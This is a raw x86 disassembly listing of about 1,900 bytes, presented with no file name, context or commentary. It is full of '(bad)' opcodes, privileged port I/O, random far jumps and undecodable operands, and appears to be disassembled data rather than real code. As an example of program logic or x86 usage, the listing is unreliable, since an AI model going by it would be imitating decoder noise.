  40b660:	jecxz  0x40b655
  40b662:	in     eax,dx
  40b663:	inc    edi
  40b664:	scas   al,BYTE PTR es:[edi]
  40b665:	(bad)  
  40b666:	dec    ecx
  40b667:	and    DWORD PTR [ebx],esp
  40b669:	dec    esi
  40b66a:	jl     0x40b682
  40b66c:	enter  0x9496,0xf8
  40b670:	enter  0x7478,0x12
  40b674:	outs   dx,DWORD PTR ds:[esi]
  40b675:	and    dh,BYTE PTR [ebp+0x75]
  40b678:	push   esp
  40b679:	loope  0x40b6db
  40b67b:	or     al,0x93
  40b67d:	cmp    esp,DWORD PTR [ebx-0xa9078b7]
  40b683:	dec    esp
  40b684:	add    BYTE PTR [esi*1-0x1d1180da],0xd9
  40b68c:	ins    DWORD PTR es:[edi],dx
  40b68d:	gs pop es
  40b68f:	sbb    DWORD PTR [ebx],ebx
  40b691:	or     BYTE PTR [ebx],al
  40b693:	sbb    DWORD PTR [esi],ebp
  40b695:	jge    0x40b693
  40b697:	shl    DWORD PTR [ebx],1
  40b699:	or     al,0x4f
  40b69b:	and    BYTE PTR [ecx],0xa6
  40b69e:	jae    0x40b686
  40b6a0:	push   cs
  40b6a1:	mov    ebp,0xf61f8b80
  40b6a6:	adc    edi,DWORD PTR [ebp-0x26]
  40b6a9:	into   
  40b6aa:	into   
  40b6ab:	inc    edi
  40b6ac:	mov    bl,0xfd
  40b6ae:	jns    0x40b6d1
  40b6b0:	das    
  40b6b1:	mov    eax,0xbdd2a533
  40b6b6:	in     eax,0x9b
  40b6b8:	mov    ds:0x9eaaf07f,eax
  40b6bd:	xchg   BYTE PTR [esi+0xe],bh
  40b6c0:	sbb    DWORD PTR [ebp+0x45],esi
  40b6c3:	jmp    0x7af7:0x8e6411a6
  40b6ca:	cmp    BYTE PTR [ebx+ecx*4],ch
  40b6cd:	fdivr  QWORD PTR [esi-0xc]
  40b6d0:	stc    
  40b6d1:	or     ecx,DWORD PTR [ebx-0xf232f4b]
  40b6d7:	out    0xdb,eax
  40b6d9:	test   DWORD PTR [ecx],esp
  40b6db:	leave  
  40b6dc:	xchg   edx,eax
  40b6dd:	in     al,0x2f
  40b6df:	xchg   esi,eax
  40b6e0:	inc    ebp
  40b6e1:	(bad)  
  40b6e2:	int    0x8d
  40b6e4:	mov    al,0x13
  40b6e6:	and    DWORD PTR [edi],edx
  40b6e8:	aas    
  40b6e9:	cmp    DWORD PTR [ebx],eax
  40b6eb:	xor    DWORD PTR [edx+0x7b],ebp
  40b6ee:	cwde   
  40b6ef:	sub    ebp,esp
  40b6f1:	mov    eax,ds:0xeb97deea
  40b6f6:	in     al,0x10
  40b6f8:	es pop ecx
  40b6fa:	mov    bl,0x10
  40b6fc:	adc    eax,esp
  40b6fe:	xor    eax,DWORD PTR [esi-0x42]
  40b701:	sub    al,0x9b
  40b703:	pop    esp
  40b704:	pop    ebx
  40b705:	sub    DWORD PTR [ecx-0x5f],ebx
  40b708:	mov    dl,0xbb
  40b70a:	test   DWORD PTR [edx+0x5b],esp
  40b70d:	mov    eax,ds:0x57f7aa32
  40b712:	pop    ebx
  40b713:	push   edi
  40b714:	in     al,0xf8
  40b716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b717:	push   es
  40b718:	outs   dx,DWORD PTR ds:[esi]
  40b719:	out    0x27,eax
  40b71b:	cmp    eax,0x6bacaa15
  40b720:	mov    ch,0xec
  40b722:	dec    ch
  40b724:	ins    DWORD PTR es:[edi],dx
  40b725:	or     al,0x5c
  40b727:	mov    edi,0xc656b4b
  40b72c:	sub    eax,0xb45e7af5
  40b731:	outs   dx,BYTE PTR ds:[esi]
  40b732:	lea    ebx,[edi]
  40b734:	std    
  40b735:	sbb    DWORD PTR [ecx],esp
  40b737:	loope  0x40b6bb
  40b739:	in     al,dx
  40b73a:	adc    BYTE PTR [ebx+0x1d],ah
  40b73d:	fidivr WORD PTR [ecx-0xa]
  40b740:	mov    dl,0x6a
  40b742:	lods   eax,DWORD PTR ds:[esi]
  40b743:	jp     0x40b6ef
  40b745:	enter  0xa898,0xe4
  40b749:	inc    eax
  40b74a:	into   
  40b74b:	adc    DWORD PTR [eax+0x1cbb6a28],ecx
  40b751:	dec    esp
  40b752:	fwait
  40b753:	or     ax,0xa02a
  40b757:	dec    edx
  40b758:	adc    DWORD PTR [edi+eax*2+0x61],eax
  40b75c:	sbb    cl,BYTE PTR [edx+0x11fb7fb]
  40b762:	js     0x40b7b7
  40b764:	mov    edi,0x85cd0a37
  40b769:	pop    ss
  40b76a:	pop    ebx
  40b76b:	fisttp WORD PTR [edx-0x6]
  40b76e:	sub    BYTE PTR [esi],ah
  40b770:	jle    0x40b71d
  40b772:	inc    ebp
  40b773:	fnstsw WORD PTR [ebx+0x3b949158]
  40b779:	retf   
  40b77a:	out    0xf6,al
  40b77c:	icebp  
  40b77d:	jmp    0x2247d75e
  40b782:	lea    eax,[eax+ebx*4+0x4147fe9b]
  40b789:	test   eax,0x1e35b205
  40b78e:	mov    ah,BYTE PTR [eax-0x720090ee]
  40b794:	xchg   DWORD PTR [ebx+0x483bdf16],ecx
  40b79a:	inc    ecx
  40b79b:	inc    edx
  40b79d:	mov    al,ds:0x8cb1b035
  40b7a2:	inc    ebx
  40b7a3:	(bad)  
  40b7a4:	jns    0x40b7cc
  40b7a6:	leave  
  40b7a7:	inc    eax
  40b7a8:	and    BYTE PTR [ecx+edx*2+0x3704f0a3],cl
  40b7af:	mov    ah,0x69
  40b7b1:	ffreep st(7)
  40b7b3:	(bad)  
  40b7b4:	xor    eax,DWORD PTR [edx-0x72]
  40b7b7:	fidivr WORD PTR [ebx-0x6f8550a9]
  40b7bd:	nop
  40b7be:	mov    cl,0xa2
  40b7c0:	fnstenv ds:0xac9b265
  40b7c6:	das    
  40b7c7:	pop    esi
  40b7c8:	imul   esi,DWORD PTR [edx+0x510396aa],0x38
  40b7cf:	jmp    0xb3d:0x94eb63d9
  40b7d6:	aad    0x99
  40b7d8:	lea    eax,[ecx]
  40b7da:	loopne 0x40b78f
  40b7dc:	push   ebx
  40b7dd:	xchg   dl,dl
  40b7df:	jge    0x40b791
  40b7e1:	ds xchg ecx,eax
  40b7e3:	cmp    BYTE PTR [edx],al
  40b7e5:	mov    dl,0x62
  40b7e7:	adc    bh,BYTE PTR [ecx-0x72663f3c]
  40b7ed:	retf   0x464b
  40b7f0:	cli    
  40b7f1:	out    0x77,al
  40b7f3:	push   edi
  40b7f4:	out    dx,eax
  40b7f5:	popf   
  40b7f6:	mov    DWORD PTR [eax+edi*1],ebx
  40b7f9:	add    eax,0x591e3f5f
  40b7fe:	pop    es
  40b7ff:	adc    DWORD PTR [esi],edx
  40b801:	dec    edi
  40b802:	int    0xbf
  40b804:	inc    esp
  40b805:	xor    esi,DWORD PTR ss:[edx]
  40b808:	xor    eax,0x1361c0d5
  40b80d:	xchg   ecx,eax
  40b80e:	jmp    0xc070:0x109747f2
  40b815:	call   0x6035c8bd
  40b81a:	dec    ecx
  40b81b:	shr    BYTE PTR [edx],0x2d
  40b81e:	sbb    BYTE PTR [edx-0x6a],0x5b
  40b822:	jge    0x40b807
  40b824:	sub    cl,bh
  40b826:	popa   
  40b827:	adc    esp,DWORD PTR [eax+0x3593f4a2]
  40b82d:	add    DWORD PTR [eax-0x3f],esi
  40b830:	and    al,0x22
  40b832:	gs nop
  40b834:	xlat   BYTE PTR gs:[ebx]
  40b836:	mov    DWORD PTR [eax-0x67cb1d52],edi
  40b83c:	xchg   esi,eax
  40b83d:	xor    ecx,DWORD PTR [ecx]
  40b83f:	jo     0x40b7f9
  40b841:	and    al,0x2a
  40b843:	fdiv   DWORD PTR [ebx]
  40b845:	xchg   edi,eax
  40b846:	xchg   esp,eax
  40b847:	sub    ecx,DWORD PTR [edx]
  40b849:	dec    ebp
  40b84a:	retf   0xa951
  40b84d:	pop    esi
  40b84e:	push   ss
  40b84f:	mov    ch,0x14
  40b851:	cli    
  40b852:	imul   eax,DWORD PTR [ebp+0x6a5f2942],0x2c
  40b859:	mov    bh,0x57
  40b85b:	not    DWORD PTR [bp+si+0x9]
  40b85f:	adc    al,cl
  40b861:	push   ecx
  40b862:	add    ch,BYTE PTR [ebx-0x54fefe36]
  40b868:	add    al,0xa
  40b86a:	pop    edx
  40b86b:	and    eax,edi
  40b86d:	jmp    0x7269c186
  40b872:	stc    
  40b873:	push   es
  40b874:	(bad)  
  40b876:	mov    WORD PTR [esi],fs
  40b878:	std    
  40b879:	pop    edi
  40b87a:	dec    edi
  40b87b:	xor    eax,0xf971eff1
  40b880:	sub    al,0xb
  40b882:	push   es
  40b883:	fnsave [esi-0x46]
  40b886:	data16 or ah,BYTE PTR [esi-0x23525e7f]
  40b88d:	xchg   ecx,eax
  40b88e:	adc    BYTE PTR [esi],al
  40b890:	sbb    dl,ah
  40b892:	in     al,dx
  40b893:	mov    bl,0xbb
  40b895:	xor    esi,ebp
  40b897:	stos   DWORD PTR es:[edi],eax
  40b898:	call   0x2bb821a0
  40b89d:	mov    ebp,0xa800fa98
  40b8a2:	mov    ebp,0xbc3b7655
  40b8a7:	std    
  40b8a8:	inc    eax
  40b8a9:	cmp    bl,BYTE PTR [ebx-0x46e8fc2a]
  40b8af:	push   eax
  40b8b0:	popf   
  40b8b1:	nop
  40b8b2:	loop   0x40b8fc
  40b8b4:	and    eax,DWORD PTR [edi+0x62]
  40b8b7:	es add eax,0x2c208412
  40b8bd:	fsub   st,st(5)
  40b8bf:	xor    al,0xf9
  40b8c1:	cmc    
  40b8c2:	mov    bl,0x3d
  40b8c4:	rcl    BYTE PTR [ebp+0x50a49ea],cl
  40b8ca:	imul   edx,DWORD PTR [eax+0x77],0xa4239c84
  40b8d1:	push   edx
  40b8d2:	bound  ebx,QWORD PTR [edx+0x3b56ba59]
  40b8d8:	mov    ds:0x7ac39aca,eax
  40b8dd:	jg     0x40b8f3
  40b8df:	stc    
  40b8e0:	mov    DWORD PTR [edx],ebp
  40b8e2:	push   eax
  40b8e3:	and    al,0xb
  40b8e5:	xor    DWORD PTR [ebp-0x49],ebx
  40b8e8:	pushf  
  40b8e9:	sub    al,0x86
  40b8eb:	sbb    ch,BYTE PTR [eax]
  40b8ed:	aad    0x62
  40b8ef:	cmp    DWORD PTR [edx],eax
  40b8f1:	aad    0x1
  40b8f3:	push   eax
  40b8f4:	pop    ds
  40b8f5:	mov    al,ds:0xcb09a3ab
  40b8fa:	mov    ebx,0x76875059
  40b8ff:	dec    edi
  40b900:	hlt    
  40b901:	inc    esp
  40b902:	mov    ebx,0x8bdf1508
  40b907:	je     0x40b8b4
  40b909:	jge    0x40b8fe
  40b90b:	(bad)  
  40b90c:	js     0x40b92d
  40b90e:	sbb    bl,BYTE PTR [esp-0x11bb3580]
  40b915:	std    
  40b916:	es add al,0x25
  40b919:	sub    esi,eax
  40b91b:	xchg   esp,eax
  40b91c:	jne    0x40b90a
  40b91e:	enter  0x6e51,0x78
  40b922:	stos   BYTE PTR es:[edi],al
  40b923:	adc    DWORD PTR [edi+0x63],0x1b7ecdeb
  40b92a:	icebp  
  40b92b:	mov    edx,0x8cd15274
  40b930:	push   cs
  40b931:	sbb    eax,0xe99a0c10
  40b936:	mov    eax,ds:0x3d61ef75
  40b93b:	adc    al,0xcd
  40b93d:	jno    0x40b987
  40b93f:	retf   0x2b7b
  40b942:	sub    BYTE PTR [ebx+0x1013dc7d],al
  40b948:	(bad)  
  40b949:	leave  
  40b94a:	add    dh,BYTE PTR [eax+0x69]
  40b94d:	and    ebx,edi
  40b94f:	out    0xc8,eax
  40b951:	stos   DWORD PTR es:[edi],eax
  40b952:	aad    0xce
  40b954:	xchg   esp,eax
  40b955:	lea    eax,[ebp+0xe70f193]
  40b95b:	test   esp,edx
  40b95d:	adc    dh,dl
  40b95f:	aaa    
  40b960:	dec    edx
  40b961:	fdiv   st(7),st
  40b963:	aad    0x74
  40b965:	icebp  
  40b966:	push   ecx
  40b967:	out    0xc4,eax
  40b969:	push   0xffffff9e
  40b96b:	push   esp
  40b96c:	and    ebx,DWORD PTR [eax-0x266404ff]
  40b972:	cwde   
  40b973:	and    eax,0x82480b73
  40b978:	xor    dl,BYTE PTR [ebx]
  40b97a:	jg     0x40b99f
  40b97c:	adc    esi,DWORD PTR [ebx+ebp*2]
  40b97f:	add    eax,0xeff153f8
  40b984:	mov    al,0xb
  40b986:	add    ecx,edx
  40b988:	loop   0x40b951
  40b98a:	scas   al,BYTE PTR es:[edi]
  40b98b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b98c:	inc    BYTE PTR [eax-0x29]
  40b98f:	inc    edx
  40b990:	lahf   
  40b991:	push   edx
  40b992:	xchg   ebp,eax
  40b993:	lock shl DWORD PTR [esi+0x74],cl
  40b997:	xor    al,0xc3
  40b999:	mov    ds:0x27214025,al
  40b99e:	popa   
  40b99f:	pop    ss
  40b9a0:	mov    BYTE PTR [esi+0x6],bh
  40b9a3:	jnp    0x40b990
  40b9a5:	mov    bl,bh
  40b9a7:	add    DWORD PTR [eax],0xd6f08c16
  40b9ad:	jno    0x40b991
  40b9af:	inc    edi
  40b9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b1:	out    0x3b,eax
  40b9b3:	sub    al,0xdb
  40b9b5:	call   0x11a3c280
  40b9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bb:	mov    al,ds:0xa8d961cc
  40b9c0:	loope  0x40b9ac
  40b9c2:	mov    cl,0xed
  40b9c4:	data16 rcl BYTE PTR [edi-0x7acb6337],1
  40b9cb:	lea    edx,[edx]
  40b9cd:	mov    ds:0xb14fabae,eax
  40b9d2:	hlt    
  40b9d3:	jmp    0xe9b8:0x25b9d318
  40b9da:	push   ss
  40b9db:	(bad)  
  40b9dc:	pop    edx
  40b9dd:	pushf  
  40b9de:	add    edx,0x4
  40b9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e2:	add    BYTE PTR [esi-0x4d88933b],bl
  40b9e8:	imul   ebp,DWORD PTR [ebx+0x3cf5aa2c],0x61
  40b9ef:	xor    esi,DWORD PTR [esi-0x2f]
  40b9f2:	addr16 pop ss
  40b9f4:	mov    ebx,DWORD PTR [ecx+ecx*1-0xf]
  40b9f8:	jge    0x40ba00
  40b9fa:	shl    DWORD PTR [eax+eax*4+0x1c],1
  40b9fe:	scas   al,BYTE PTR es:[edi]
  40b9ff:	ja     0x40b98f
  40ba01:	in     al,dx
  40ba02:	mov    edi,0xc0ce9cf3
  40ba07:	daa    
  40ba08:	mov    edi,0x73e0854a
  40ba0d:	inc    esi
  40ba0e:	test   eax,0xcded363
  40ba13:	jne    0x40ba0d
  40ba15:	adc    al,0xca
  40ba17:	test   al,0x32
  40ba19:	sbb    cl,ch
  40ba1b:	add    eax,edi
  40ba1d:	in     al,0xa3
  40ba1f:	add    al,0xd
  40ba21:	das    
  40ba22:	aas    
  40ba23:	lock push eax
  40ba25:	pop    edi
  40ba26:	stos   DWORD PTR es:[edi],eax
  40ba27:	cmp    BYTE PTR [ebx],dl
  40ba29:	sbb    cl,bl
  40ba2b:	(bad)  
  40ba2c:	mov    fs,esp
  40ba2e:	sub    eax,0x60fa8c92
  40ba33:	jp     0x40ba33
  40ba35:	sbb    al,0x8c
  40ba37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba38:	dec    edi
  40ba39:	xchg   ebp,eax
  40ba3a:	rcr    BYTE PTR [ebx],1
  40ba3c:	inc    esi
  40ba3d:	push   esi
  40ba3e:	call   0xe58f8f9
  40ba43:	imul   esi,DWORD PTR [ebx-0x3f],0x29375c7a
  40ba4a:	iret   
  40ba4b:	arpl   WORD PTR [eax+0x63],sp
  40ba4e:	fwait
  40ba4f:	test   BYTE PTR [esi-0x290fe315],cl
  40ba55:	rol    DWORD PTR [esi-0x6d],cl
  40ba58:	mov    edx,0x3dd4d369
  40ba5d:	std    
  40ba5e:	mov    eax,0x148bb33f
  40ba63:	test   al,0x76
  40ba65:	dec    edi
  40ba66:	into   
  40ba67:	adc    bh,BYTE PTR [ebp+ebx*8-0x64749425]
  40ba6e:	in     al,dx
  40ba6f:	mov    al,bh
  40ba71:	mov    al,0xd7
  40ba73:	(bad)  
  40ba74:	or     eax,0xedc72da6
  40ba79:	and    DWORD PTR [eax+0x2f],eax
  40ba7c:	test   BYTE PTR [ebp-0x68],0x57
  40ba80:	and    ebp,DWORD PTR [edi+0x4edf873f]
  40ba86:	xor    ecx,DWORD PTR [ebx]
  40ba88:	fstp   QWORD PTR [edi]
  40ba8a:	inc    ecx
  40ba8b:	xor    dh,dl
  40ba8d:	test   eax,0x65830e31
  40ba92:	inc    ebx
  40ba93:	jmp    0xd967d587
  40ba98:	out    dx,al
  40ba99:	sar    esp,0x7c
  40ba9c:	mov    al,0xc9
  40ba9e:	push   cs
  40ba9f:	push   ebp
  40baa0:	fcmovnbe st,st(4)
  40baa2:	xchg   ebp,eax
  40baa3:	and    DWORD PTR [ebx+ebp*4+0x287b5f65],esp
  40baaa:	xchg   ebx,eax
  40baab:	mov    ds:0x652b926,eax
  40bab0:	xchg   ecx,eax
  40bab1:	adc    ebp,DWORD PTR [eax+0x4ebd805b]
  40bab7:	mov    DWORD PTR [ecx-0x7c],ecx
  40baba:	push   cs
  40babb:	pop    edx
  40babc:	pop    ebx
  40babd:	cmp    DWORD PTR [edx-0x143ccb0e],ebx
  40bac3:	add    BYTE PTR [eax-0x29c1f350],dh
  40bac9:	scas   al,BYTE PTR es:[edi]
  40baca:	ins    DWORD PTR es:[edi],dx
  40bacb:	mov    bh,0xd9
  40bacd:	xor    DWORD PTR [ebp+0x2c7d636c],edi
  40bad3:	in     eax,dx
  40bad4:	pop    ecx
  40bad5:	test   eax,0xfeb10712
  40bada:	adc    BYTE PTR [ebx+esi*1-0x71],cl
  40bade:	int3   
  40badf:	sahf   
  40bae0:	daa    
  40bae1:	aaa    
  40bae2:	xchg   esi,eax
  40bae3:	or     edx,DWORD PTR [edi+0x79]
  40bae6:	outs   dx,BYTE PTR ds:[esi]
  40bae7:	xor    edx,ebp
  40bae9:	inc    esi
  40baea:	xor    ecx,eax
  40baec:	mov    ?,WORD PTR [edi+eiz*4+0x4f]
  40baf0:	push   0xdfc5e6b2
  40baf5:	lods   eax,DWORD PTR ds:[esi]
  40baf6:	sub    edi,ebp
  40baf8:	and    edi,DWORD PTR [ebp+edx*4-0x3e919b9c]
  40baff:	rol    DWORD PTR [esp+ebx*8+0x3e53eeea],1
  40bb06:	xchg   esi,eax
  40bb07:	mov    ecx,0x28b8da9d
  40bb0c:	clc    
  40bb0d:	fs sub ecx,edx
  40bb10:	stos   BYTE PTR es:[edi],al
  40bb11:	sub    DWORD PTR [esi+esi*8-0x57a36b53],ebx
  40bb18:	aaa    
  40bb19:	add    BYTE PTR [edx+edx*4+0x532de4e2],bl
  40bb20:	pop    ecx
  40bb21:	inc    ebp
  40bb22:	jge    0x40bae0
  40bb24:	pop    es
  40bb25:	adc    eax,0x1c7d1a7d
  40bb2a:	dec    ebp
  40bb2b:	and    DWORD PTR [eax],ecx
  40bb2d:	inc    ecx
  40bb2e:	das    
  40bb2f:	add    cl,BYTE PTR [eax-0x3745b3c9]
  40bb35:	dec    esi
  40bb36:	stos   DWORD PTR es:[edi],eax
  40bb37:	mov    DWORD PTR [eax-0x1209fbff],ebp
  40bb3d:	jmp    0x6411:0xd6f61087
  40bb44:	mov    eax,0xbb45ab8b
  40bb49:	and    bh,BYTE PTR [edi]
  40bb4b:	xchg   ebx,eax
  40bb4c:	jb     0x40bbac
  40bb4e:	fwait
  40bb4f:	scas   eax,DWORD PTR es:[edi]
  40bb50:	jno    0x40bb79
  40bb52:	cdq    
  40bb53:	or     bl,0xff
  40bb56:	inc    esp
  40bb57:	imul   esp,ebx,0x47
  40bb5a:	sahf   
  40bb5b:	jle    0x40bb55
  40bb5d:	iret   
  40bb5e:	std    
  40bb5f:	mov    dh,0xfb
  40bb61:	sub    ebx,edi
  40bb63:	dec    eax
  40bb64:	ficomp DWORD PTR [ecx+0x4d05b054]
  40bb6a:	pop    edx
  40bb6b:	out    dx,al
  40bb6c:	popf   
  40bb6d:	js     0x40bb51
  40bb6f:	std    
  40bb70:	pop    ds
  40bb71:	call   0x8271:0xc617ceaf
  40bb78:	shl    DWORD PTR [ebx+0x3340de30],1
  40bb7e:	(bad)
  40bb81:	bnd js 0x40bb4c
  40bb84:	mov    eax,ds:0x78605ef7
  40bb89:	sbb    eax,0x2f98cf41
  40bb8e:	fcomp  QWORD PTR [eax]
  40bb90:	mov    ah,0x2a
  40bb92:	cmp    BYTE PTR [edi-0x4b49dba7],al
  40bb98:	jge    0x40bc0f
  40bb9a:	stos   DWORD PTR es:[edi],eax
  40bb9b:	inc    ebp
  40bb9c:	test   BYTE PTR [edx+0x7140bd1f],bh
  40bba2:	jne    0x40bb72
  40bba4:	popf   
  40bba5:	adc    esi,DWORD PTR [esi]
  40bba7:	adc    eax,DWORD PTR [edx-0x1230497c]
  40bbad:	mov    WORD PTR [esi],gs
  40bbaf:	push   cs
  40bbb0:	or     esp,esi
  40bbb2:	adc    al,0x24
  40bbb4:	jmp    0x1635:0xf973b4cd
  40bbbb:	mov    ?,WORD PTR [eax+0x48]
  40bbbe:	jne    0x40bbf7
  40bbc0:	xor    eax,0xcfd7dae4
  40bbc5:	xchg   esp,eax
  40bbc6:	jg     0x40bb8e
  40bbc8:	push   ss
  40bbc9:	ret    0x17d4
  40bbcc:	or     cl,BYTE PTR [edx+esi*8]
  40bbcf:	loop   0x40bb9f
  40bbd1:	or     BYTE PTR [ecx-0x3f],bl
  40bbd4:	jmp    0x99136548
  40bbd9:	push   eax
  40bbda:	jae    0x40bc59
  40bbdc:	jl     0x40bc2e
  40bbde:	sub    BYTE PTR [eax],al
  40bbe0:	mov    ah,0x1f
  40bbe2:	mov    eax,0x506422db
  40bbe7:	xor    eax,DWORD PTR [eax]
  40bbe9:	pop    ebp
  40bbea:	xchg   BYTE PTR [edx-0x749b4f90],cl
  40bbf0:	sbb    eax,0x9953ac3f
  40bbf5:	cmp    al,BYTE PTR [eax]
  40bbf7:	adc    al,0xcf
  40bbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfa:	mov    esi,DWORD PTR [ebp+0x36b819aa]
  40bc00:	push   es
  40bc01:	pop    es
  40bc02:	add    al,0x6e
  40bc04:	cdq    
  40bc05:	(bad)  
  40bc06:	fst    QWORD PTR [eax+eiz*2+0x1b]
  40bc0a:	mov    esi,0x50a8c985
  40bc0f:	daa    
  40bc10:	dec    esi
  40bc11:	mov    es,WORD PTR [ebx]
  40bc13:	into   
  40bc14:	xchg   ebp,eax
  40bc15:	jo     0x40bc47
  40bc17:	and    edi,DWORD PTR [esi+0x5d41e477]
  40bc1d:	or     eax,0x929f3fd4
  40bc22:	dec    ah
  40bc24:	pusha  
  40bc25:	cmp    cl,al
  40bc27:	test   al,0xcc
  40bc29:	push   ecx
  40bc2a:	test   esp,0x3778bd39
  40bc30:	and    DWORD PTR [ebp+0x56],esp
  40bc33:	mov    ah,0x7e
  40bc35:	mov    edi,0x44f2f857
  40bc3a:	ins    DWORD PTR es:[edi],dx
  40bc3b:	fnsave [ebp+0x35]
  40bc3e:	call   0x121a:0xf01f91e3
  40bc45:	imul   eax
  40bc47:	sar    DWORD PTR [ecx+ebx*1],0x65
  40bc4b:	not    DWORD PTR [edi]
  40bc4d:	xlat   BYTE PTR ds:[ebx]
  40bc4e:	and    ecx,DWORD PTR [eax+0x22b74157]
  40bc54:	sub    ebx,DWORD PTR [edi+ebx*2]
  40bc57:	retf   
  40bc58:	jmp    0xc1fe:0x3578874f
  40bc5f:	out    dx,al
  40bc60:	sub    al,BYTE PTR [ecx-0x4d40fe35]
  40bc66:	and    eax,0x611e2162
  40bc6b:	sahf   
  40bc6c:	sub    eax,0x1d90810c
  40bc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc72:	icebp  
  40bc73:	dec    esp
  40bc74:	cdq    
  40bc75:	ret    
  40bc76:	dec    BYTE PTR [eax-0x48cfde11]
  40bc7c:	ja     0x40bc46
  40bc7e:	mov    ds:0xe548a256,eax
  40bc83:	dec    ecx
  40bc84:	rcl    cl,1
  40bc86:	(bad)  
  40bc87:	mov    ebp,0x72d5fc66
  40bc8c:	sbb    al,0xe0
  40bc8e:	leave  
  40bc8f:	popa   
  40bc90:	mov    ebp,0x9dbe8a66
  40bc95:	push   esi
  40bc96:	call   0x18e6:0xf2510504
  40bc9d:	js     0x40bc87
  40bc9f:	lea    edx,[ecx-0x78]
  40bca2:	(bad)  
  40bca3:	int3   
  40bca4:	mov    edx,DWORD PTR [edi-0x2c]
  40bca7:	inc    ebp
  40bca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bca9:	or     DWORD PTR [ebx+esi*4-0x39],edi
  40bcad:	loopne 0x40bc95
  40bcaf:	push   ebp
  40bcb0:	push   edi
  40bcb1:	jecxz  0x40bd18
  40bcb3:	mov    ch,0x89
  40bcb5:	inc    edx
  40bcb6:	fdivr  QWORD PTR [esi-0x298d03]
  40bcbc:	cld    
  40bcbd:	and    ecx,ebx
  40bcbf:	lds    edi,FWORD PTR [ecx-0x25048289]
  40bcc5:	mov    al,ds:0x63be19dd
  40bcca:	push   0xcf2460f4
  40bccf:	sub    DWORD PTR [edx+0x53d30659],esi
  40bcd5:	add    al,0xd
  40bcd7:	push   es
  40bcd8:	js     0x40bce4
  40bcda:	dec    edi
  40bcdb:	or     esi,DWORD PTR [eax-0x666a1669]
  40bce1:	fwait
  40bce2:	repz pop edx
  40bce4:	mov    esi,0x4922cf07
  40bce9:	popf   
  40bcea:	arpl   WORD PTR [edx],ax
  40bcec:	pushf  
  40bced:	dec    ecx
  40bcee:	mov    fs,esi
  40bcf0:	sar    DWORD PTR [bx],0x48
  40bcf4:	js     0x40bcec
  40bcf6:	sbb    al,0x4b
  40bcf8:	stc    
  40bcf9:	test   al,0x63
  40bcfb:	pusha  
  40bcfc:	es push cs
  40bcfe:	adc    bl,al
  40bd00:	adc    eax,0xfc25d9a9
  40bd05:	or     dl,bl
  40bd07:	mov    DWORD PTR [esi-0x54a92ade],0xd498261c
  40bd11:	ret    0xd2e0
  40bd14:	(bad)  
  40bd16:	icebp  
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	lods   eax,DWORD PTR ds:[esi]
  40bd1a:	push   esp
  40bd1b:	ins    BYTE PTR es:[edi],dx
  40bd1c:	jns    0x40bce7
  40bd1e:	mov    al,0xb1
  40bd20:	jecxz  0x40bd38
  40bd22:	rol    WORD PTR [si+0x26],0xa0
  40bd28:	ret    0x759c
  40bd2b:	cmp    BYTE PTR [eax-0x42],bl
  40bd2e:	fadd   DWORD PTR [edx+0x74]
  40bd31:	ja     0x40bd6a
  40bd33:	add    ch,BYTE PTR [eax]
  40bd35:	es jl  0x40bcd6
  40bd38:	jns    0x40bd71
  40bd3a:	xchg   edi,eax
  40bd3b:	jge    0x40bda3
  40bd3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd3e:	lods   al,BYTE PTR ds:[esi]
  40bd3f:	ss adc al,0x45
  40bd42:	pop    ebx
  40bd43:	mov    ch,0x2
  40bd45:	call   0x2d9c:0xc332a1ad
  40bd4c:	jmp    0x40bd7f
  40bd4e:	xchg   ecx,eax
  40bd4f:	jmp    0xa29a:0x65604504
  40bd56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd57:	inc    ebx
  40bd58:	cmp    dh,BYTE PTR [eax+ebx*2-0x1d]
  40bd5c:	je     0x40bd70
  40bd5e:	jns    0x40bd26
  40bd60:	push   ebx
  40bd61:	pop    eax
  40bd62:	mov    cs,WORD PTR [edx]
  40bd64:	fucom  st(7)
  40bd66:	jmp    0x9f3e:0xaa2ebfaf
  40bd6d:	imul   BYTE PTR [edx]
  40bd6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd70:	test   DWORD PTR [edi-0xb],ebp
  40bd73:	cdq    
  40bd74:	hlt    
  40bd75:	(bad)  
  40bd76:	cli    
  40bd77:	std    
  40bd78:	sub    ch,BYTE PTR [ebp+esi*1-0x45cffbe9]
  40bd7f:	mov    eax,ds:0x74f6c4fe
  40bd84:	xlat   BYTE PTR ds:[ebx]
  40bd85:	cmp    al,0x9
  40bd87:	fwait
  40bd88:	test   BYTE PTR [esi-0x7d],bh
  40bd8b:	out    0xd0,eax
  40bd8d:	ins    BYTE PTR es:[edi],dx
  40bd8e:	lods   eax,DWORD PTR ds:[esi]
  40bd8f:	xor    BYTE PTR [esi+0x4e],ch
  40bd92:	jmp    0xaa25:0x5caf6613
  40bd99:	push   ebx
  40bd9a:	(bad)  [esi-0x2945070]
  40bda0:	aaa    
  40bda1:	add    esp,DWORD PTR [ebx-0x695e7299]
  40bda7:	cs in  eax,0xbd
  40bdaa:	ins    DWORD PTR es:[edi],dx
  40bdab:	(bad)  
  40bdac:	ins    DWORD PTR es:[edi],dx
  40bdad:	pop    ecx
  40bdae:	add    edi,ebp
  40bdb0:	test   DWORD PTR [ebx],ecx
  40bdb2:	or     DWORD PTR [ecx-0x21],0xffffffe6
  40bdb6:	cld    
  40bdb7:	mov    ds:0x73fbde14,eax
  40bdbc:	test   DWORD PTR [esi+0x9],ebp
  40bdbf:	jg     0x40bd59
  40bdc1:	inc    ebx
  40bdc2:	xchg   edi,eax
  40bdc3:	mov    WORD PTR [ebp+esi*4-0x43],fs
  40bdc7:	jns    0x40bd94
  40bdc9:	mov    WORD PTR [ebx-0x30],?
  40bdcc:	dec    esp
  40bdcd:	cmp    edx,DWORD PTR [ebx]
